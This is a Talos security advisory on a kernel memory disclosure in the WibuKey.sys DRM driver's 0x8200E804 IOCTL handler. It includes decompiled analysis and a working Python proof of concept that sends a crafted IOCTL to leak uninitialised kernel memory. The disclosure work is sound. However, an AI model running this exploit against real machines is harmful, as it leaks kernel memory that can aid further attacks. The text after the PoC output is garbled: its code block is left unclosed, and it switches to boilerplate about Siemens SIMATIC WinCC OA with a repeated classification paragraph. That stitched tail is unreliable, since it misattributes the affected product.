# Talos Vulnerability Report

### TALOS-2018-0657

## WIBU-SYSTEMS WibuKey.sys 0x8200E804 kernel memory information disclosure vulnerability

##### January 28, 2019

##### CVE Number

CVE-2018-3989

### Summary

An exploitable kernel memory disclosure vulnerability exists in the 0x8200E804 IOCTL handler functionality of WIBU-SYSTEMS WibuKey.sys Version 6.40 (Build 2400).

A specially crafted IRP request can cause the driver to return uninitialized memory, resulting in kernel memory disclosure. An attacker can send an IRP request to trigger this vulnerability.

### Tested Versions

WIBU-SYSTEMS WibuKey.sys Version 6.40 (Build 2400) - Windows 7 x86

### Product URLs

<https://www.wibu.com/products/wibukey.html>

### CVSSv3 Score

4.3 - CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N

### CWE

CWE-200: Information Exposure

### Details

WibuKey is a complete DRM solution used by many applications, such as Straton, Archicad, GRAPHISOFT, V-Ray and many more. Part of WibuKey solution is in the hardware, and part of it is a WibuKey Runtime for Windows package that contains important Windows drivers and services. This advisory is for a vulnerability in the driver installed by the Windows package.

This vulnerability can be triggered by sending IOCTL requests to the WibuKey device. Here, we show the default access controls on the device allow any user on the system to send IOCTL requests:

```
accesschk.exe -q -o \Device\WibuKey
\Device\WibuKey
  Type: Device
  RW Everyone
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  R  NT AUTHORITY\RESTRICTED

```

The kernel memory leak is located in the IOCTL handler for the `0x8200E804` control code. The vulnerable function is:

```
Line 1 	int __stdcall sub_A08360F0(struct_buffer_1 *buffer, struct_allocatedBuffer *allocatedBuffer)
Line 2 	{
Line 3 	  someSize = buffer->someSize;
Line 4 	  v5 = buffer->unsigned6;
Line 5 	  result = v5 - 16;
Line 6 	  *(_DWORD *)allocatedBuffer->data = 0xC80B2;
Line 7 	  *(_WORD *)&allocatedBuffer->data[4] = 0x81;
Line 8 	  switch ( result )
Line 9 	  {
Line 10		 case 19:
Line 11		  v8 = sub_A08324B0(buffer->dword8, (_DWORD *)(buffer->dwordC > 0u ? (unsigned int)&buffer->unsigned10 : 0));
Line 12	LABEL_97:
Line 13		  *(_DWORD *)&allocatedBuffer->data[8] = v8;
Line 14		  v9 = v8 != 0;
Line 15		  goto LABEL_98;
Line 16		 (...)
Line 17	LABEL_98
Line 18	(...)
Line 19		  *(_WORD *)&allocatedBuffer->data[2] = someSize;

```

At `Line 5` if the result of the substraction `v5 - 16` is equal to `19` we can see that `*(_WORD *)&allocatedBuffer->data[2]` at `line 19` is set to the value of the `someSize` variable.

The value of `someSize` is set based on data coming from the user at `line 3`. In the end, we fully control the value set to the `*(_WORD *)&allocatedBuffer->data[2]` field.

Moving up, we see the following code:

```
Line 1 	NTSTATUS __stdcall sub_A0835C60(_DEVICE_OBJECT *DeviceObject, PIRP Irp)
Line 2 	{
Line 3 	(...)
Line 4 			  allocatedBuffer = (struct_allocatedBuffer *)allocPool(outLen);
Line 5 			  if ( allocatedBuffer )
Line 6 			  {
Line 7 				if ( inBuffer->someSize <= outLen )
Line 8 				{
Line 9 				  sub_A08360F0(inBuffer, allocatedBuffer);
Line 10				  v9 = *(unsigned __int16 *)&allocatedBuffer->data[2];
Line 12				  if ( v9 <= outLen )
Line 13				  {
Line 14					memmove(inBuffer, allocatedBuffer, v9);
Line 15					v4 = 0;
Line 16					Irp->IoStatus.Information = v9;
Line 17				  }

```

As we can see at `line 10`, the value from `*(_WORD *)&allocatedBuffer->data[2]` is assigned to the `v9` variable, which is later compared with `outLen (OutputBufferLength)` at `line 7`.

If we pass the constraint, `someSize` bytes from `allocatedBuffer` are copied to `inBuffer` and returned to the user. Since the `allocatedBuffer` has not been cleared anywhere and there is no check to see how many bytes have really been set to it during this procedure, random kernel memory will be leaked to user space.

### Exploit Proof of Concept

```
def leak_memory():
	fileName = u'\\\\.\\WibuKey'
	hFile = win32file.CreateFileW(fileName,
						  win32con.GENERIC_READ |win32con.GENERIC_WRITE,
						  0,
						  None,
						  win32con.OPEN_EXISTING, 0 , None, 0)
	print "Handle ready : ",repr(hFile)

	try:
		 ioctl = 0x8200E804
		 outBufferLen = 0x2e12 #FIXED
		 inputBuffer  = "XXXX" #gap
		 inputBuffer += struct.pack("<H",0x2e12) #unsigned4
		 inputBuffer += struct.pack("<B",35)   # unsigned6 FIXED
		 inputBuffer += "X" #gap
		 inputBuffer += struct.pack("<I",random.randint(0,0xFFFFFFFF) ) #dword8
		 inputBuffer += struct.pack("<I",random.randint(0,0xFFFFFFFF) ) #dwordC
		 inputBuffer += struct.pack("<I",0xFFFFFFFE ) #unsigned10
		 inputBuffer += struct.pack("<I",0xFFFFFFFD )#dword14
		 inputBuffer += struct.pack("<B",random.randint(0,0xFF))#char18
		 inputBuffer += "XXX"
		 inputBuffer += struct.pack("<I",random.randint(0,0xFFFFFFFF) ) #dword1c
		 inputBuffer += struct.pack("<B",random.randint(0,0xFF) )

		 inputBufferLen = len(inputBuffer)
		 print "Time to send IOCTL : 0x%x" % ioctl
		 buf = win32file.DeviceIoControl(hFile, ioctl,inputBuffer,outBufferLen)
	except Exception as e:
		print e.message

leak_memory()

Output:

Handle ready :  <PyHANDLE:160>
outBufferSize :  11794
appCode :  35

VULNERABILITY CLASSIFICATION

The vulnerability classiﬁcation has been performed by using the CVSS scoring system in version 3.0
(CVSS v3.0) (https://www.ﬁrst.org/cvss/). The CVSS environmental score is speciﬁc to the customer’s
environment and will impact the overall CVSS score. The environmental score should therefore be
individually deﬁned by the customer to accomplish ﬁnal scoring.

PRODUCT DESCRIPTION

The client-server HMI (human machine interface) system SIMATIC WinCC Open Architecture (OA) is part
of the SIMATIC HMI family. It is designed for use in applications requiring a high degree of customer-
speciﬁc adaptability, large or complex applications and projects that impose speciﬁc system requirements
or functions.

VULNERABILITY CLASSIFICATION

The vulnerability classiﬁcation has been performed by using the CVSS scoring system in version 3.0
(CVSS v3.0) (https://www.ﬁrst.org/cvss/). The CVSS environmental score is speciﬁc to the customer’s
environment and will impact the overall CVSS score. The environmental score should therefore be
individually deﬁned by the customer to accomplish ﬁnal scoring.
